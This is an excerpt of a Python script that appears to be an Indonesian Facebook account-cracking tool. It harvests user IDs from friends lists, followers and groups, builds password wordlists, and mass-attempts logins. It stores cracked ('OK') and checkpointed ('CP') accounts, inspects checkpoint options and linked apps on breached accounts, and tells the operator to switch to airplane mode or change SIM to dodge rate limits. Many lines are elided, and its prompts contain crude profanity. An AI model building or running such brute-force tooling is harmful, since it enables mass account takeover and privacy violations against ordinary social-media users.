...
╔════════════════════════════════════════╗
║[•] FROM RECODE BY    : M R. S I L E N T                 ║
╚════════════════════════════════════════╝''')
#--------------------[ PARTS-IN ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\celamate Come [green]%s[white] Ngentod'%(my_name)))
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		print('>> Success Logout+Remove Cookies ')
		exit()
	else:
...
#-----------------[ RESULTS-CRACK ]-----------------#
def result():
	print('>> Results OK You ')
	print('>> Results CP You ')
	print('>> Return	')
	kz = input('\n>> Select : ')
	if kz in ['1','01']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> How much do you want Njing? ? : '))
	except ValueError:
		print('>> Enter Dog Figures, Even Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Fail Dump Idz ')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input('>> Enter Idz The Th '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'>> Total Idz The Collected🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		...
		print(f'>>{k} Friendship No Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('>> Type ( me ) If you want to Crack Follower Own ')
...
def lah():
	...
	input(balmond+m +"\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m If you want direct Crack !!")
	pass
	setting()
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> Enter Idz Group :\x1b[1;94m ")
	...
	try:
		...
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Group Publik","")
	...
	print(""+balmond+p+" \x1b[1;94m>> Name Group :\x1b[1;97m "+berr2)
		...
		try:
			...
			for cari in tes:
				...
				if 'mengajukan' in spl:
					...
					namayou = liatnih.replace(' submit question .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Take ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Gather ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				...
				girang2 = girang.text.replace(" | Facebook","").replace(" Group Publik","")
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Enter cut-off Additional Minimal 6 Character\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Enter Password Additional : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Currently Shift Sun {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> Results {h}OK{x} Stored Di : {h}OK/%s {x}'%(okc))
	print(f'>> Results {k}CP{x} Stored Di : {k}CP/%s {x}'%(cpc))
...
def cek_opsi():
	c = len(akun)
	hu = 'Be found %s Account To Check\Before Start, Airplane Mode/Change Sim Card Above all'%(c)
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Check Login In Lite/Basic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
...
def cek_apk(session,cookie):
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh no expired apps on this account.")
	else:
		for i in range(len(game)):
